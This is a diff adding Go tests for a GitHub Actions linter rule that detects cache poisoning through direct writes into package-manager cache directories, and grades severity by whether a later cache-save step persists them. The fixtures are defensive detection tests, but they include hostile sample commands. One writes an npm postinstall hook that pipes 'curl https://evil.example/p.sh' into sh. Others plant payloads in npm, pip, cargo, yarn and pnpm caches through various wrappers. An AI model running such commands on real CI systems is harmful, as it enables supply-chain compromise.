@@ -1386,6 +1386,657 @@ func TestCachePoisoningRule_DirectCachePoison_CombinedWithIndirect(t *testing.T)
 	}
 }
 
+func TestCachePoisoningRule_DirectCacheDirectoryWrite(t *testing.T) {
+	t.Parallel()
+
+	tests := []struct {
+		name          string
+		script        string
+		wantErrors    int
+		wantSubstring string
+	}{
+		{
+			name: "mkdir writes npm cache directory",
+			script: `mkdir -p ~/.npm/_cacache/content-v2/sha512
+cat > ~/.npm/_cacache/content-v2/sha512/malicious <<'PAYLOAD'
+{"scripts":{"postinstall":"curl https://evil.example/p.sh | sh"}}
+PAYLOAD`,
+			wantErrors:    2,
+			wantSubstring: "~/.npm",
+		},
+		{
+			name:          "mkdir writes npm cache directory without trailing slash",
+			script:        `mkdir -p ~/.npm/_cacache`,
+			wantErrors:    1,
+			wantSubstring: "~/.npm",
+		},
+		{
+			name:          "cp writes pip cache directory",
+			script:        `cp payload.whl ~/.cache/pip/wheels/payload.whl`,
+			wantErrors:    1,
+			wantSubstring: "~/.cache/pip",
+		},
+		{
+			name:          "mkdir writes cargo registry cache",
+			script:        `mkdir -p ~/.cargo/registry/src/malicious`,
+			wantErrors:    1,
+			wantSubstring: "~/.cargo",
+		},
+		{
+			name:          "touch writes gradle cache",
+			script:        `touch ~/.gradle/caches/modules-2/files-2.1/payload`,
+			wantErrors:    1,
+			wantSubstring: "~/.gradle",
+		},
+		{
+			name:          "printf redirects into maven repository cache",
+			script:        `printf '%s\n' payload > ~/.m2/repository/com/example/payload.jar`,
+			wantErrors:    1,
+			wantSubstring: "~/.m2",
+		},
+		{
+			name:          "install writes go module cache",
+			script:        `install -D payload ~/go/pkg/mod/cache/download/example.com/mod/@v/v1.0.0.zip`,
+			wantErrors:    1,
+			wantSubstring: "~/go/pkg/mod",
+		},
+		{
+			name:          "sudo wrapper still writes npm cache directory",
+			script:        `sudo -E mkdir -p ~/.npm/_cacache/content-v2/sha512`,
+			wantErrors:    1,
+			wantSubstring: "~/.npm",
+		},
+		{
+			name:          "env wrapper still writes npm cache directory",
+			script:        `env FOO=bar mkdir -p ~/.npm/_cacache/content-v2/sha512`,
+			wantErrors:    1,
+			wantSubstring: "~/.npm",
+		},
+		{
+			name:          "chained command writes npm cache directory",
+			script:        `sudo mkdir -p ~/.npm/_cacache && echo ok`,
+			wantErrors:    1,
+			wantSubstring: "~/.npm",
+		},
+		{
+			name:          "cp to pip cache followed by chained command",
+			script:        `cp payload.whl ~/.cache/pip/wheels/payload.whl && echo done`,
+			wantErrors:    1,
+			wantSubstring: "~/.cache/pip",
+		},
+		{
+			name:          "pipe into tee writes npm cache directory",
+			script:        `printf payload | tee ~/.npm/_cacache/content-v2/sha512/malicious`,
+			wantErrors:    1,
+			wantSubstring: "~/.npm",
+		},
+		{
+			name:          "shell wrapper writes npm cache directory",
+			script:        `sh -c 'mkdir -p ~/.npm/_cacache/content-v2/sha512'`,
+			wantErrors:    1,
+			wantSubstring: "~/.npm",
+		},
+		{
+			name:          "package manager cache command is not direct write",
+			script:        `npm cache verify`,
+			wantErrors:    0,
+			wantSubstring: "",
+		},
+		{
+			name:          "cache directory read is not direct write",
+			script:        `ls ~/.npm/_cacache/content-v2/sha512`,
+			wantErrors:    0,
+			wantSubstring: "",
+		},
+		{
+			name:          "echoing cache directory path is not direct write",
+			script:        `echo ~/.npm/_cacache/content-v2/sha512`,
+			wantErrors:    0,
+			wantSubstring: "",
+		},
+		{
+			name:          "cat reads cache directory file without redirection",
+			script:        `cat ~/.npm/_cacache/content-v2/sha512/cache-entry`,
+			wantErrors:    0,
+			wantSubstring: "",
+		},
+		{
+			name:          "copying from cache directory is not direct write",
+			script:        `cp ~/.cache/pip/wheels/pkg.whl ./pkg.whl`,
+			wantErrors:    0,
+			wantSubstring: "",
+		},
+		{
+			name:          "chained read after unrelated write is not cache directory write",
+			script:        `mkdir -p ./tmp && ls ~/.npm/_cacache/content-v2/sha512`,
+			wantErrors:    0,
+			wantSubstring: "",
+		},
+		{
+			name:          "sibling directory with similar prefix is not cache directory",
+			script:        `mkdir -p ~/.npm-old/_cacache`,
+			wantErrors:    0,
+			wantSubstring: "",
+		},
+		{
+			name:          "cp writes relative bundler vendor cache",
+			script:        `cp payload.gem vendor/bundle/ruby/3.0.0/cache/payload.gem`,
+			wantErrors:    1,
+			wantSubstring: "vendor/bundle",
+		},
+		{
+			name:          "sibling of relative bundler vendor cache is not flagged",
+			script:        `mkdir -p vendor/bundle-old/cache`,
+			wantErrors:    0,
+			wantSubstring: "",
+		},
+		{
+			name:          "inline bash -c redirect writes npm cache directory",
+			script:        `bash -c 'echo payload > ~/.npm/_cacache/content-v2/sha512/malicious'`,
+			wantErrors:    1,
+			wantSubstring: "~/.npm",
+		},
+		{
+			name:          "nested inline bash -c writes npm cache directory",
+			script:        `bash -c 'bash -c "mkdir -p ~/.npm/_cacache/content-v2/sha512/malicious"'`,
+			wantErrors:    1,
+			wantSubstring: "~/.npm",
+		},
+		{
+			name:          "timeout with duration still writes npm cache directory",
+			script:        `timeout 5s mkdir -p ~/.npm/_cacache/content-v2/sha512`,
+			wantErrors:    1,
+			wantSubstring: "~/.npm",
+		},
+		{
+			name:          "timeout without duration still writes npm cache directory",
+			script:        `timeout mkdir -p ~/.npm/_cacache/content-v2/sha512`,
+			wantErrors:    1,
+			wantSubstring: "~/.npm",
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			t.Parallel()
+
+			rule := NewCachePoisoningRule()
+			workflow := &ast.Workflow{
+				On: []ast.Event{
+					&ast.WebhookEvent{Hook: &ast.String{Value: "push"}},
+				},
+			}
+			_ = rule.VisitWorkflowPre(workflow)
+			job := &ast.Job{}
+			_ = rule.VisitJobPre(job)
+
+			step := &ast.Step{
+				Pos: &ast.Position{Line: 10, Col: 1},
+				Exec: &ast.ExecRun{
+					Run: &ast.String{
+						Value: tt.script,
+						Pos:   &ast.Position{Line: 11, Col: 9},
+					},
+				},
+			}
+			_ = rule.VisitStep(step)
+			// Deferred reports are emitted in VisitJobPost so the rule can
+			// split severity based on whether a cache-save step follows.
+			_ = rule.VisitJobPost(job)
+
+			errors := rule.Errors()
+			if len(errors) != tt.wantErrors {
+				t.Fatalf("Expected %d errors, got %d: %#v", tt.wantErrors, len(errors), errors)
+			}
+			if tt.wantSubstring != "" {
+				// Validate every reported error, not just the first: cases that
+				// expect multiple writes (wantErrors > 1) must all match.
+				for i, e := range errors {
+					if !strings.Contains(e.Description, tt.wantSubstring) {
+						t.Fatalf("Expected error %d to contain %q, got %q", i, tt.wantSubstring, e.Description)
+					}
+					// No cache-save step in these cases → reports must be the
+					// softer "(suspicious)" tier.
+					if !strings.Contains(e.Description, "(suspicious)") {
+						t.Fatalf("Expected error %d to be tagged (suspicious), got %q", i, e.Description)
+					}
+				}
+			}
+		})
+	}
+}
+
+func TestCachePoisoningRule_DirectCacheDirectoryWriteBeforeCacheSave(t *testing.T) {
+	t.Parallel()
+
+	rule := NewCachePoisoningRule()
+	workflow := &ast.Workflow{
+		On: []ast.Event{
+			&ast.WebhookEvent{Hook: &ast.String{Value: "push"}},
+		},
+	}
+	_ = rule.VisitWorkflowPre(workflow)
+	job := &ast.Job{}
+	_ = rule.VisitJobPre(job)
+
+	writeStep := &ast.Step{
+		Pos: &ast.Position{Line: 10, Col: 1},
+		Exec: &ast.ExecRun{
+			Run: &ast.String{
+				Value: `echo "payload" >> ~/.npm/_cacache/content-v2/sha512/malicious`,
+				Pos:   &ast.Position{Line: 11, Col: 9},
+			},
+		},
+	}
+	_ = rule.VisitStep(writeStep)
+
+	saveStep := &ast.Step{
+		Pos: &ast.Position{Line: 12, Col: 1},
+		Exec: &ast.ExecAction{
+			Uses: &ast.String{Value: "actions/cache/save@v4"},
+			Inputs: map[string]*ast.Input{
+				"path": {Value: &ast.String{Value: "~/.npm\n~/.cache/yarn", Pos: &ast.Position{Line: 14, Col: 15}}},
+				"key":  {Value: &ast.String{Value: "npm-${{ github.sha }}", Pos: &ast.Position{Line: 15, Col: 14}}},
+			},
+		},
+	}
+	_ = rule.VisitStep(saveStep)
+	_ = rule.VisitJobPost(job)
+
+	errors := rule.Errors()
+	if len(errors) != 1 {
+		t.Fatalf("Expected exactly 1 critical write report, got %d: %#v", len(errors), errors)
+	}
+	if !strings.Contains(errors[0].Description, "(critical)") {
+		t.Fatalf("Expected report to be tagged (critical), got %q", errors[0].Description)
+	}
+	if !strings.Contains(errors[0].Description, "~/.npm") {
+		t.Fatalf("Expected report to mention cache directory, got %q", errors[0].Description)
+	}
+	if !strings.Contains(errors[0].Description, "cache action in the same job") {
+		t.Fatalf("Expected report to explain the persistence vector, got %q", errors[0].Description)
+	}
+}
+
+func TestCachePoisoningRule_DirectCacheDirectoryWriteBeforeUnrelatedCacheSave(t *testing.T) {
+	t.Parallel()
+
+	rule := NewCachePoisoningRule()
+	workflow := &ast.Workflow{
+		On: []ast.Event{
+			&ast.WebhookEvent{Hook: &ast.String{Value: "push"}},
+		},
+	}
+	_ = rule.VisitWorkflowPre(workflow)
+	job := &ast.Job{}
+	_ = rule.VisitJobPre(job)
+
+	writeStep := &ast.Step{
+		Pos: &ast.Position{Line: 10, Col: 1},
+		Exec: &ast.ExecRun{
+			Run: &ast.String{
+				Value: `echo "payload" >> ~/.npm/_cacache/content-v2/sha512/malicious`,
+				Pos:   &ast.Position{Line: 11, Col: 9},
+			},
+		},
+	}
+	_ = rule.VisitStep(writeStep)
+
+	saveStep := &ast.Step{
+		Pos: &ast.Position{Line: 12, Col: 1},
+		Exec: &ast.ExecAction{
+			Uses: &ast.String{Value: "actions/cache/save@v4"},
+			Inputs: map[string]*ast.Input{
+				"path": {Value: &ast.String{Value: "./dist", Pos: &ast.Position{Line: 14, Col: 15}}},
+				"key":  {Value: &ast.String{Value: "dist-${{ github.sha }}", Pos: &ast.Position{Line: 15, Col: 14}}},
+			},
+		},
+	}
+	_ = rule.VisitStep(saveStep)
+	_ = rule.VisitJobPost(job)
+
+	errors := rule.Errors()
+	if len(errors) != 1 {
+		t.Fatalf("Expected exactly 1 write report, got %d: %#v", len(errors), errors)
+	}
+	if !strings.Contains(errors[0].Description, "(suspicious)") {
+		t.Fatalf("Unrelated cache save path must keep write suspicious, got %q", errors[0].Description)
+	}
+	if strings.Contains(errors[0].Description, "(critical)") {
+		t.Fatalf("Unrelated cache save path must not escalate to critical, got %q", errors[0].Description)
+	}
+}
+
+// TestCachePoisoningRule_DirectCacheDirectoryWriteWithRestoreOnly verifies that
+// a restore-only cache step (actions/cache/restore) does NOT escalate a direct
+// cache directory write to "(critical)": restore-only never persists at job
+// end, so the write stays in the softer "(suspicious)" tier.
+func TestCachePoisoningRule_DirectCacheDirectoryWriteWithRestoreOnly(t *testing.T) {
+	t.Parallel()
+
+	rule := NewCachePoisoningRule()
+	workflow := &ast.Workflow{
+		On: []ast.Event{
+			&ast.WebhookEvent{Hook: &ast.String{Value: "push"}},
+		},
+	}
+	_ = rule.VisitWorkflowPre(workflow)
+	job := &ast.Job{}
+	_ = rule.VisitJobPre(job)
+
+	restoreStep := &ast.Step{
+		Pos: &ast.Position{Line: 10, Col: 1},
+		Exec: &ast.ExecAction{
+			Uses: &ast.String{Value: "actions/cache/restore@v4"},
+			Inputs: map[string]*ast.Input{
+				"path": {Value: &ast.String{Value: "~/.npm", Pos: &ast.Position{Line: 11, Col: 15}}},
+				"key":  {Value: &ast.String{Value: "npm-${{ github.sha }}", Pos: &ast.Position{Line: 12, Col: 14}}},
+			},
+		},
+	}
+	_ = rule.VisitStep(restoreStep)
+
+	writeStep := &ast.Step{
+		Pos: &ast.Position{Line: 13, Col: 1},
+		Exec: &ast.ExecRun{
+			Run: &ast.String{
+				Value: `echo "payload" >> ~/.npm/_cacache/content-v2/sha512/malicious`,
+				Pos:   &ast.Position{Line: 14, Col: 9},
+			},
+		},
+	}
+	_ = rule.VisitStep(writeStep)
+	_ = rule.VisitJobPost(job)
+
+	errors := rule.Errors()
+	if len(errors) != 1 {
+		t.Fatalf("Expected exactly 1 write report, got %d: %#v", len(errors), errors)
+	}
+	if !strings.Contains(errors[0].Description, "(suspicious)") {
+		t.Fatalf("Expected restore-only write to stay (suspicious), got %q", errors[0].Description)
+	}
+	if strings.Contains(errors[0].Description, "(critical)") {
+		t.Fatalf("restore-only must not escalate to (critical), got %q", errors[0].Description)
+	}
+}
+
+// TestCachePoisoningRule_DirectCacheDirectoryWriteAfterCacheSave verifies that
+// a write occurring AFTER actions/cache/save@v* does NOT escalate to critical:
+// actions/cache/save persists at the moment the step executes, so subsequent
+// writes are not picked up by it. The pre-save write must still be critical
+// while the post-save write stays in the softer "(suspicious)" tier.
+func TestCachePoisoningRule_DirectCacheDirectoryWriteAfterCacheSave(t *testing.T) {
+	t.Parallel()
+
+	rule := NewCachePoisoningRule()
+	workflow := &ast.Workflow{
+		On: []ast.Event{
+			&ast.WebhookEvent{Hook: &ast.String{Value: "push"}},
+		},
+	}
+	_ = rule.VisitWorkflowPre(workflow)
+	job := &ast.Job{}
+	_ = rule.VisitJobPre(job)
+
+	preSaveWrite := &ast.Step{
+		Pos: &ast.Position{Line: 10, Col: 1},
+		Exec: &ast.ExecRun{
+			Run: &ast.String{
+				Value: `echo "pre" >> ~/.npm/_cacache/content-v2/sha512/before`,
+				Pos:   &ast.Position{Line: 11, Col: 9},
+			},
+		},
+	}
+	_ = rule.VisitStep(preSaveWrite)
+
+	saveStep := &ast.Step{
+		Pos: &ast.Position{Line: 12, Col: 1},
+		Exec: &ast.ExecAction{
+			Uses: &ast.String{Value: "actions/cache/save@v4"},
+			Inputs: map[string]*ast.Input{
+				"path": {Value: &ast.String{Value: "~/.npm", Pos: &ast.Position{Line: 14, Col: 15}}},
+				"key":  {Value: &ast.String{Value: "npm-${{ github.sha }}", Pos: &ast.Position{Line: 15, Col: 14}}},
+			},
+		},
+	}
+	_ = rule.VisitStep(saveStep)
+
+	postSaveWrite := &ast.Step{
+		Pos: &ast.Position{Line: 16, Col: 1},
+		Exec: &ast.ExecRun{
+			Run: &ast.String{
+				Value: `echo "post" >> ~/.cache/yarn/after`,
+				Pos:   &ast.Position{Line: 17, Col: 9},
+			},
+		},
+	}
+	_ = rule.VisitStep(postSaveWrite)
+	_ = rule.VisitJobPost(job)
+
+	errors := rule.Errors()
+	if len(errors) != 2 {
+		t.Fatalf("Expected exactly 2 write reports, got %d: %#v", len(errors), errors)
+	}
+
+	var preSaveErr, postSaveErr string
+	for _, err := range errors {
+		switch {
+		case strings.Contains(err.Description, "~/.npm"):
+			preSaveErr = err.Description
+		case strings.Contains(err.Description, "~/.cache/yarn"):
+			postSaveErr = err.Description
+		}
+	}
+	if preSaveErr == "" {
+		t.Fatalf("Expected pre-save write report, got %#v", errors)
+	}
+	if postSaveErr == "" {
+		t.Fatalf("Expected post-save write report, got %#v", errors)
+	}
+	if !strings.Contains(preSaveErr, "(critical)") {
+		t.Fatalf("Expected pre-save write to be (critical), got %q", preSaveErr)
+	}
+	if !strings.Contains(postSaveErr, "(suspicious)") {
+		t.Fatalf("Expected post-save write to stay (suspicious), got %q", postSaveErr)
+	}
+	if strings.Contains(postSaveErr, "(critical)") {
+		t.Fatalf("post-save write must not escalate to (critical), got %q", postSaveErr)
+	}
+}
+
+// TestCachePoisoningRule_DirectCacheDirectoryWriteAfterCacheSaveWithPostJobSave
+// covers the case where a post-step actions/cache/save@v* runs early in the
+// job AND a post-job persisting action (actions/cache@v* or actions/setup-*
+// with cache enabled) also runs. The post-job save persists the job-end state,
+// so writes after the in-line save still escalate to critical.
+func TestCachePoisoningRule_DirectCacheDirectoryWriteAfterCacheSaveWithPostJobSave(t *testing.T) {
+	t.Parallel()
+
+	workflow := &ast.Workflow{
+		On: []ast.Event{
+			&ast.WebhookEvent{Hook: &ast.String{Value: "push"}},
+		},
+	}
+	tests := []struct {
+		name             string
+		postJobPersister *ast.Step
+	}{
+		{
+			name: "actions cache",
+			postJobPersister: &ast.Step{
+				Pos: &ast.Position{Line: 15, Col: 1},
+				Exec: &ast.ExecAction{
+					Uses: &ast.String{Value: "actions/cache@v4"},
+					Inputs: map[string]*ast.Input{
+						"path": {Value: &ast.String{Value: "~/.npm", Pos: &ast.Position{Line: 16, Col: 15}}},
+						"key":  {Value: &ast.String{Value: "npm-${{ github.sha }}", Pos: &ast.Position{Line: 17, Col: 14}}},
+					},
+				},
+			},
+		},
+		{
+			name: "setup-node cache",
+			postJobPersister: &ast.Step{
+				Pos: &ast.Position{Line: 15, Col: 1},
+				Exec: &ast.ExecAction{
+					Uses: &ast.String{Value: "actions/setup-node@v4"},
+					Inputs: map[string]*ast.Input{
+						"node-version": {Value: &ast.String{Value: "20", Pos: &ast.Position{Line: 16, Col: 25}}},
+						"cache":        {Value: &ast.String{Value: "npm", Pos: &ast.Position{Line: 17, Col: 16}}},
+					},
+				},
+			},
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			rule := NewCachePoisoningRule()
+			_ = rule.VisitWorkflowPre(workflow)
+			job := &ast.Job{}
+			_ = rule.VisitJobPre(job)
+
+			saveStep := &ast.Step{
+				Pos: &ast.Position{Line: 10, Col: 1},
+				Exec: &ast.ExecAction{
+					Uses: &ast.String{Value: "actions/cache/save@v4"},
+					Inputs: map[string]*ast.Input{
+						"path": {Value: &ast.String{Value: "~/.npm", Pos: &ast.Position{Line: 11, Col: 15}}},
+						"key":  {Value: &ast.String{Value: "npm-${{ github.sha }}", Pos: &ast.Position{Line: 12, Col: 14}}},
+					},
+				},
+			}
+			_ = rule.VisitStep(saveStep)
+
+			postSaveWrite := &ast.Step{
+				Pos: &ast.Position{Line: 13, Col: 1},
+				Exec: &ast.ExecRun{
+					Run: &ast.String{
+						Value: `echo "post" >> ~/.npm/_cacache/content-v2/sha512/after`,
+						Pos:   &ast.Position{Line: 14, Col: 9},
+					},
+				},
+			}
+			_ = rule.VisitStep(postSaveWrite)
+			_ = rule.VisitStep(tt.postJobPersister)
+			_ = rule.VisitJobPost(job)
+
+			errors := rule.Errors()
+			if len(errors) != 1 {
+				t.Fatalf("Expected exactly 1 write report, got %d: %#v", len(errors), errors)
+			}
+			if !strings.Contains(errors[0].Description, "(critical)") {
+				t.Fatalf("post-job save must escalate post-step write to (critical), got %q", errors[0].Description)
+			}
+		})
+	}
+}
+
+func TestCachePoisoningRule_DirectCacheDirectoryWriteBeforeMismatchedSetupCache(t *testing.T) {
+	t.Parallel()
+
+	rule := NewCachePoisoningRule()
+	workflow := &ast.Workflow{
+		On: []ast.Event{
+			&ast.WebhookEvent{Hook: &ast.String{Value: "push"}},
+		},
+	}
+	_ = rule.VisitWorkflowPre(workflow)
+	job := &ast.Job{}
+	_ = rule.VisitJobPre(job)
+
+	writeStep := &ast.Step{
+		Pos: &ast.Position{Line: 10, Col: 1},
+		Exec: &ast.ExecRun{
+			Run: &ast.String{
+				Value: `mkdir -p ~/.cargo/registry/src/malicious`,
+				Pos:   &ast.Position{Line: 11, Col: 9},
+			},
+		},
+	}
+	_ = rule.VisitStep(writeStep)
+
+	setupNodeStep := &ast.Step{
+		Pos: &ast.Position{Line: 12, Col: 1},
+		Exec: &ast.ExecAction{
+			Uses: &ast.String{Value: "actions/setup-node@v4"},
+			Inputs: map[string]*ast.Input{
+				"node-version": {Value: &ast.String{Value: "20", Pos: &ast.Position{Line: 13, Col: 25}}},
+				"cache":        {Value: &ast.String{Value: "npm", Pos: &ast.Position{Line: 14, Col: 16}}},
+			},
+		},
+	}
+	_ = rule.VisitStep(setupNodeStep)
+	_ = rule.VisitJobPost(job)
+
+	errors := rule.Errors()
+	if len(errors) != 1 {
+		t.Fatalf("Expected exactly 1 write report, got %d: %#v", len(errors), errors)
+	}
+	if !strings.Contains(errors[0].Description, "(suspicious)") {
+		t.Fatalf("Mismatched setup cache must keep write suspicious, got %q", errors[0].Description)
+	}
+	if strings.Contains(errors[0].Description, "(critical)") {
+		t.Fatalf("Mismatched setup cache must not escalate to critical, got %q", errors[0].Description)
+	}
+}
+
+func TestCachePoisoningRule_DirectCacheDirectoryWriteBeforeCompositeCacheSave(t *testing.T) {
+	t.Parallel()
+
+	workflowYAML := `
+name: w
+on: pull_request_target
+jobs:
+  w:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: refs/pull/${{ github.event.pull_request.number }}/merge
+      - run: echo "payload" >> ~/.npm/_cacache/content-v2/sha512/malicious
+      - uses: owner/cache-composite@main
+`
+	workflow, errs := Parse([]byte(workflowYAML))
+	if len(errs) > 0 {
+		t.Fatalf("Parse returned errors: %v", errs)
+	}
+
+	resolver := fakeActionMetadataResolver{
+		"owner/cache-composite@main": {
+			Runs: &ActionRunsMetadata{
+				Using: "composite",
+				Steps: []*ActionStepMetadata{
+					{
+						Uses: "actions/cache/save@v4",
+						With: ActionStepWithMetadata{
+							"path": "~/.npm",
+							"key":  "npm-${{ github.sha }}",
+						},
+					},
+				},
+			},
+		},
+	}
+	rule := NewCachePoisoningRule(resolver)
+	visitor := NewSyntaxTreeVisitor()
+	visitor.AddVisitor(rule)
+	if err := visitor.VisitTree(workflow); err != nil {
+		t.Fatalf("VisitTree returned error: %v", err)
+	}
+
+	var foundCriticalDirectWrite bool
+	for _, err := range rule.Errors() {
+		if strings.Contains(err.Description, "package manager cache directory write") &&
+			strings.Contains(err.Description, "(critical)") {
+			foundCriticalDirectWrite = true
+		}
+	}
+	if !foundCriticalDirectWrite {
+		t.Fatalf("Expected composite cache save to promote direct write to critical, got %#v", rule.Errors())
+	}
+}
+
 // Tests for new cache poisoning patterns (predictable keys, release workflows)
 
 func TestCachePoisoningRule_PredictableCacheKey(t *testing.T) {
@@ -1868,6 +2519,111 @@ func TestCachePoisoningRule_IsPushToDefaultBranch(t *testing.T) {
 			got := rule.isPushToDefaultBranch(tt.event)
 			if got != tt.expected {
 				t.Errorf("isPushToDefaultBranch() = %v, want %v", got, tt.expected)
+			}
+		})
+	}
+}
+
+// TestCachePoisoningRule_DirectCacheDirectoryWrite_EndToEnd exercises the
+// full Parse → VisitTree pipeline for direct cache-directory writes. This
+// catches issues that hand-built ast trees miss, e.g. visitor ordering and
+// position propagation through the YAML loader.
+func TestCachePoisoningRule_DirectCacheDirectoryWrite_EndToEnd(t *testing.T) {
+	t.Parallel()
+
+	tests := []struct {
+		name         string
+		yaml         string
+		wantSeverity string // "(suspicious)" or "(critical)"
+		wantPath     string
+		wantCount    int
+	}{
+		{
+			name: "default ~/.npm write without save is suspicious",
+			yaml: `
+name: w
+on: push
+jobs:
+  w:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          mkdir -p ~/.npm/_cacache/content-v2/sha512
+`,
+			wantSeverity: "(suspicious)",
+			wantPath:     "~/.npm",
+			wantCount:    1,
+		},
+		{
+			name: "yarn cache write before actions/cache is critical",
+			yaml: `
+name: w
+on: push
+jobs:
+  w:
+    runs-on: ubuntu-latest
+    steps:
+      - run: tar -xf payload.tar -C ~/.cache/yarn
+      - uses: actions/cache@v4
+        with:
+          path: ~/.cache/yarn
+          key: yarn-${{ github.sha }}
+`,
+			wantSeverity: "(critical)",
+			wantPath:     "~/.cache/yarn",
+			wantCount:    1,
+		},
+		{
+			name: "pnpm store write before setup-node with cache: pnpm is critical",
+			yaml: `
+name: w
+on: push
+jobs:
+  w:
+    runs-on: ubuntu-latest
+    steps:
+      - run: cp ./payload ~/.local/share/pnpm/store/v3/files/00/payload
+      - uses: actions/setup-node@v4
+        with:
+          node-version: 20
+          cache: pnpm
+`,
+			wantSeverity: "(critical)",
+			wantPath:     "~/.local/share/pnpm/store",
+			wantCount:    1,
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			t.Parallel()
+
+			workflow, parseErrs := Parse([]byte(tt.yaml))
+			if len(parseErrs) > 0 {
+				t.Fatalf("Parse returned errors: %v", parseErrs)
+			}
+
+			rule := NewCachePoisoningRule()
+			visitor := NewSyntaxTreeVisitor()
+			visitor.AddVisitor(rule)
+			if err := visitor.VisitTree(workflow); err != nil {
+				t.Fatalf("VisitTree returned error: %v", err)
+			}
+
+			var writeErrs []string
+			for _, e := range rule.Errors() {
+				if strings.Contains(e.Description, "cache poisoning via package manager cache directory write") {
+					writeErrs = append(writeErrs, e.Description)
+				}
+			}
+			if len(writeErrs) != tt.wantCount {
+				t.Fatalf("len(write errors) = %d, want %d:\n%s", len(writeErrs), tt.wantCount, strings.Join(writeErrs, "\n"))
+			}
+			if !strings.Contains(writeErrs[0], tt.wantSeverity) {
+				t.Fatalf("write error severity not %q: %s", tt.wantSeverity, writeErrs[0])
+			}
+			if !strings.Contains(writeErrs[0], tt.wantPath) {
+				t.Fatalf("write error path not %q: %s", tt.wantPath, writeErrs[0])
 			}
 		})
 	}
